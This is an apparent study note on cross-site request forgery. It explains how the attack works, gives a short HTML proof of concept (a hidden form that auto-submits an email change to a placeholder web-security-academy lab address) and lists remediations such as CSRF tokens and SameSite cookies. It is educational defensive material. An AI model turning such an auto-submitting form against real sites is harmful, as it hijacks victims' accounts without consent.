# Cross Site Request Forgery (CSRF)

- CSRF is an attack where a logged-in user is tricked into performing unintended actions on a web application without their knowledge.

### Exploitation

- Victim is logged into a trusted site (e.g banking apps)
- Attacker sends a malicious link/page (email, message, hidden form)
- When the victim clicks/loads it, the browser automatically includes session cookies
- The request gets executed as if it’s from the legitimate user
    
    ```basic
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="anything%40web-security-academy.net">
    </form>
    <script>
            document.forms[0].submit();
    </script>
    ```
    
- This can lead to :
    - Transfer money
    - Change email/password
    - Perform actions without user consent

### Remediation

- Use CSRF tokens
- Implement SameSite cookies
- Require re-authentication for sensitive actions
- Validate request origin (Origin/Referer headers)